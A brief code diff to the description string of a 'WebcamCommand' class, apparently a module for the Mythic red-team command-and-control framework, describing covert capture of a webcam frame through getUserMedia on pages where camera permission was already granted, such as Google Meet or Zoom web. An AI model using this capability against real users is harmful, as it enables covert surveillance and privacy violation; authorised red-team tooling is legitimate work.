@@ -21,7 +21,8 @@ class WebcamCommand(CommandBase):
     description    = (
         "Capture a single frame from the user's webcam via getUserMedia. "
         "Works on pages where camera permission was previously granted "
-        "(e.g. Google Meet, Zoom web). 10 s timeout."
+        "(e.g. Google Meet, Zoom web). 10 s timeout. "
+        "PNG is stored in Mythic Search Files and Screenshots."
     )
     version        = 1
     author         = "@asaurusrex"
